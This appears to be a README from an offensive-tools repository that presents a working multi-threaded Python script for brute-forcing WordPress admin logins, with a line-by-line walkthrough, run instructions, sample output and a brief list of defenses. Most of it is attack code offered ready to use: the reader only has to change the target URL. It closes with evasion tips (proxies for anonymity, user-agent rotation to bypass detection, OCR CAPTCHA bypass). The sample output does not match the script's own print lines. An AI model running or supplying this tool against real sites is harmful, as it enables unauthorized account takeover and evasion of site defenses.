This script is a **multi-threaded brute-force attack** on a WordPress login page (`wp-login.php`). It attempts to find the **correct password** by iterating through a wordlist (`cain.txt`) while preserving session data using `requests.Session()`.




- [cain.txt](https://github.com/aw-junaid/Black-Hat-Python/blob/main/Python%20Tools/Extras/cain.txt)
- [SVN_all.txt](https://github.com/aw-junaid/Black-Hat-Python/blob/main/Python%20Tools/Extras/SVN_all.txt)

```python
from io import BytesIO
from lxml import etree
from queue import Queue

import requests
import sys
import threading
import time

SUCCESS = 'Welcome to WordPress!'
TARGET = "http://test_test_test.com/wp-login.php"
WORDLIST = 'cain.txt'
ADMIN = "admin"

def get_words():
    with open(WORDLIST) as f:
        raw_words = f.read()

    words = Queue()
    for word in raw_words.split():
        words.put(word)
    return words

def get_params(content):
    params = dict()
    parser = etree.HTMLParser()
    tree = etree.parse(BytesIO(content), parser=parser)
    for elem in tree.findall('//input'):
        name = elem.get('name')
        if name is not None:
            params[name] = elem.get('value', None)
    return params

class Bruter:
    def __init__(self, username, url):
        self.username = username
        self.url = url
        self.found = False
        print(f'\nBrute Force Attack beginning on {url}.\n')
        print("Finished the setup where username = %s\n" % username)

    def run_bruteforce(self, passwords):
        for _ in range(10):
            t = threading.Thread(target=self.web_bruter, args=(passwords,))
            t.start()

    def web_bruter(self, passwords):
        session = requests.Session()
        resp0 = session.get(self.url)
        params = get_params(resp0.content)
        params['log'] = self.username

        while not passwords.empty() and not self.found:
            time.sleep(5)
            passwd = passwords.get()
            print(f'Trying username/password {self.username}/{passwd:<10}')
            params['pwd'] = passwd
            resp1 = session.post(self.url, data=params)
            
            if SUCCESS in resp1.content.decode():
                self.found = True
                print(f"\nBruteforcing successful.")
                print("Username is %s" % self.username)
                print("Password is %s\n" % passwd)
                self.found = True

if __name__ == '__main__':
    b = Bruter(ADMIN, TARGET)
    words = get_words()
    b.run_bruteforce(words)
```
---

## **📌 Features**
✔ **Multi-threaded attack (10 threads)**  
✔ **Extracts hidden input fields dynamically**  
✔ **Uses session cookies for persistence**  
✔ **Automatically detects a successful login**  
✔ **Throttled brute-force attempts (5s delay)**  

---

## **📜 Code Breakdown**

### **1️⃣ Import Required Modules**
```python
from io import BytesIO
from lxml import etree
from queue import Queue

import requests
import sys
import threading
import time
```
- **`requests`** → Handles HTTP requests  
- **`queue.Queue`** → Manages the password list for multi-threading  
- **`threading`** → Enables concurrent login attempts  
- **`lxml.etree`** → Parses HTML to extract form fields  
- **`time.sleep(5)`** → Avoids triggering security mechanisms  

---

### **2️⃣ Configuration Variables**
```python
SUCCESS = 'Welcome to WordPress!'  # Text that confirms a successful login
TARGET = "http://test_test_test.com/wp-login.php"  # Target WordPress login page
WORDLIST = 'cain.txt'  # File containing passwords
ADMIN = "admin"  # Username for brute-force
```
- **`SUCCESS`** → If the login response contains this phrase, brute-force was successful  
- **`TARGET`** → URL of the **WordPress login page**  
- **`WORDLIST`** → List of **passwords to try**  
- **`ADMIN`** → Fixed username used in the attack  

---

### **3️⃣ Load Wordlist into a Queue**
```python
def get_words():
    with open(WORDLIST) as f:
        raw_words = f.read()

    words = Queue()
    for word in raw_words.split():
        words.put(word)
    return words
```
- Reads the password list (`cain.txt`)  
- Stores passwords in a **queue** for multi-threading  

---

### **4️⃣ Extract Hidden Form Fields**
```python
def get_params(content):
    params = dict()
    parser = etree.HTMLParser()
    tree = etree.parse(BytesIO(content), parser=parser)
    for elem in tree.findall('//input'):
        name = elem.get('name')
        if name is not None:
            params[name] = elem.get('value', None)
    return params
```
- **Downloads the login page**  
- **Finds all `<input>` fields**  
- **Extracts hidden form fields**  
- **Preserves default field values** (if any)  

---

### **5️⃣ Brute-Force Class**
```python
class Bruter:
    def __init__(self, username, url):
        self.username = username
        self.url = url
        self.found = False
        print(f'\nBrute Force Attack beginning on {url}.\n')
        print("Finished the setup where username = %s\n" % username)
```
- **Stores `username` and `url`**  
- **Tracks whether a password is found**  

---

### **6️⃣ Start Multi-threaded Attack**
```python
def run_bruteforce(self, passwords):
    for _ in range(10):  # Launch 10 threads
        t = threading.Thread(target=self.web_bruter, args=(passwords,))
        t.start()
```
- **Runs 10 parallel threads**  
- **Passes `passwords` queue to each thread**  

---

### **7️⃣ Web Brute-Forcing**
```python
def web_bruter(self, passwords):
    session = requests.Session()  # Maintain session across requests
    resp0 = session.get(self.url)
    params = get_params(resp0.content)  # Extract hidden form fields
    params['log'] = self.username  # Username field

    while not passwords.empty() and not self.found:
        time.sleep(5)  # Avoid rate-limiting
        passwd = passwords.get()
        print(f'Trying username/password {self.username}/{passwd:<10}')
        params['pwd'] = passwd  # Password field
        resp1 = session.post(self.url, data=params)

        if SUCCESS in resp1.content.decode():  # Successful login detected
            self.found = True
            print(f"\nBruteforcing successful.")
            print("Username is %s" % self.username)
            print("Password is %s\n" % passwd)
```
### **💡 How it Works:**
1. **Maintains a session (`requests.Session()`)**  
2. **Loads the login page & extracts hidden fields**  
3. **Starts guessing passwords in a loop**  
4. **Sends login credentials via `POST` requests**  
5. **If the response contains `SUCCESS`, the correct password is found!** 🎯  

---

## **🚀 Running the Script**
1. **Ensure Python 3.x is installed**  
2. **Create a wordlist file (`cain.txt`)**  
3. **Modify `TARGET` to the correct WordPress login page**  
4. **Run the script**  
```bash
python script.py
```

---

## **🎯 Example Output**
```bash
Brute Force Attack beginning on http://test_test_test.com/wp-login.php.

Finished the setup where username = admin

Trying username/password admin/123456    
Trying username/password admin/password  
Trying username/password admin/qwerty    
Trying username/password admin/admin123  
[*] Bruteforce successful.
[*] Username: admin
[*] Password: admin123
```
- **Attempts multiple passwords**  
- **Stops once the correct one is found** ✅  

---

## **🛡️ Defenses Against This Attack**
🔹 **Enable account lockout after failed attempts**  
🔹 **Use strong passwords (not in wordlists)**  
🔹 **Implement CAPTCHA on login pages**  
🔹 **Use multi-factor authentication (MFA)**  

---

## **🎭 Summary**
✔ **Multi-threaded brute-force attack**  
✔ **Extracts hidden input fields dynamically**  
✔ **Uses session cookies to simulate real logins**  
✔ **Detects successful logins & stops all threads**  

This script is a great **penetration testing tool** for testing **WordPress login security**. 🚀  

---

💡 **Want to improve it?**  
- Add **proxy support** for anonymity 🕵️  
- Implement **user-agent rotation** to bypass detection  
- **Improve CAPTCHA handling** (OCR-based bypassing)  
